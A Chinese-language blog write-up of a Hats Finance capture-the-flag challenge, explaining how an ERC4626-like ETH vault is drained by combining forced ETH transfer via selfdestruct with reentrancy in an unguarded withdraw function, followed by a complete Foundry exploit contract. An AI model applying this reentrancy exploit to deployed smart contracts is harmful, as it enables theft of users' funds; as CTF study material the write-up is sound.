---
title: "Hats Finance CTF 2 WriteUp"
date: 2022-10-12
subtitle:    ""
description: ""
author:      "Ashley Hsu"
image:       ""
tags:        ["CTF"]
categories:  ["Solidity", "CTF" ]
---
## Intro
前陣子參加了 hats finance 辦的 ctf，比賽形式是在幾天的時間內找到合約的漏洞並提交報告及exp，雖沒得獎還是紀錄一下。

[Vault Game Repo](https://github.com/hats-finance/vault-game/tree/16a86ab35603fe79382a124b88f8ef3273b5316b)

`Vault.sol` 為一 ERC4626-like 的 vault，任何人可以存 eth 並獲得 shares。

## The Challenge
最初會deposit 1 ether 到 vault 中。
```solidity
constructor() payable ERC20(“Vault Challenge Token”, “VCT”) {
    require(msg.value == 1 ether, “Must init the contract with 1 eth”);
    _deposit(msg.sender, address(this), msg.value);
}
```
通關目標為清空 valut 的 balance:
```solidity
function captureTheFlag(address newFlagHolder) external {
    require(address(this).balance == 0, “Balance is not 0”);
    flagHolder = newFlagHolder;
}
```
## Observation
先觀察一一下能轉出 ether 的地方，`ERC4626ETH.sol` 的 `_withdraw()`(line 148):
```solidity
uint256 excessETH = totalAssets() - totalSupply();
_burn(_owner, amount);
Address.sendValue(receiver, amount);
if (excessETH > 0) {
    Address.sendValue(payable(owner()), excessETH);
}
```
`withdraw()` 跟 `redeem()`都會進`_withdraw()`，而且沒有 reentrancy guard。

注意到`_withdraw()`中，有兩個 sendValue，第一個傳送 amount ether 給 receiver，第二個會傳送 excessETH 給 owner。而 excessETH 的值一開始就被暫存，因此在第一次的 ether transfer 重入 `withdraw()`，設定 `amount = 0`，這樣便不會影響到 excessETH，藉此可以得到額外的 excessETH，最終清空 vault。

要讓 `excessETH > 0`，需增加`totalAssets()`但不能動到`totalSupply()`，可以透過 selfdestruct 強制轉移 ether 到 vault 合約中。

## Exploit
1. 建立一個合約轉入 1 ether 並調用 selfdestruct，所以此時 vault 的 excessETH = 1 ether。
2. 調用 `withdraw()`，將 amount 設為 0。
3. 重入 `withdraw()`，excessETH = 1 ether 被轉給 owner，此時 vault balance = 1 ether。
4. 回到被劫持的 `withdraw()`，excessETH = 1 ether 再次被轉給 owner，vault balance = 0。

```solidity
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/Vault.sol";
contract Destruct {
    constructor() payable {}
    function destruct(address payable target) external payable {
        selfdestruct(target);
    }
}
contract VaultTest is Test {
    Vault vault;
    bool flag = true;
    function setUp() public {}
    function testExp() public {
        vm.deal(address(this), 2 ether);
        Destruct destruct = new Destruct{value: 1 ether}();
        vault = new Vault{value: 1 ether}();
        // send unexpected ether to vault
        destruct.destruct(payable(address(vault)));
        vault.withdraw(0 ether, address(this), address(this));
        console.log("vault balance", address(vault).balance);
        vault.captureTheFlag(address(this));
        console.log("vault.flagHolder", vault.flagHolder());
    }
    receive() external payable {
        if (flag) {
            flag = !flag;
            vault.withdraw(0, address(this), address(this));
        }
    }
}
```